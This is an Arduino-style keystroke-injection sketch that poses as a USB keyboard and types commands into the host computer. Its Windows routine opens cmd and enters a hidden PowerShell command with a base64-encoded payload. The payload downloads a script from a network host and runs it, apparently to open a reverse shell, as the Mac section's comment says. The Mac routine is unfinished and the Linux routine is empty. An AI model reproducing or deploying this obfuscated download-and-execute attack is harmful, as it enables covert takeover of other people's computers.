//Set platform to the appropriate OS
//int platform = 0; //OSX
int platform = 1; //WINDOWS
//int platform = 2; //LINUX

char ctrlKey = KEY_LEFT_CTRL;

void setup() {
  // put your setup code here, to run once:
  delay(500);
  run(); 
}

void loop() {
  // put your main code here, to run repeatedly:

}

void run() {
  //Choose platform
  switch (platform) {
    case 0:
      runMac();
      break;
    case 1:
      runWindows();
      break;
    case 2:
      runLinux();
      break;
    default:
      break;
  }
}

void runMac() {
  //Open Spotlight
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.set_key1(KEY_SPACE);
  Keyboard.send_now();
  releaseKeys();
  delay(10);
  
  //open terminal
  Keyboard.print("terminal");
  delay(30);
  enterKey();

  //Initiate reverse shell
  delay(10);
  //cmd

}

void runWindows() {
  //Open Run
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();
  releaseKeys();
  delay(40);
  Keyboard.print("cmd");
  enterKey();
  delay(45);
  Keyboard.print("powershell.exe");
  Keyboard.print(" -NoP -NonI -W Hidden -E ");
  Keyboard.print("JABjAG8AZABlACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMgA2AC8AcwBoAGUAbABsAGMAbwBkAGUALQBlAG4AYwBvAGQAZQBkAC4AcABzADEAIgApAA0ACgBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABjAG8AZABlACkAKQAgAHwAIABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAE4AbwBQACAALQBOAG8AbgBJACAALQBXACAASABpAGQAZABlAG4AIAAtAEMAbwBtAG0AYQBuAGQAIAAtAA0ACgA=");
  
  enterKey(); 
}

void runLinux() {

  
}

void enterKey() {
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  releaseKeys();
}

void releaseKeys() {
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now(); 
}

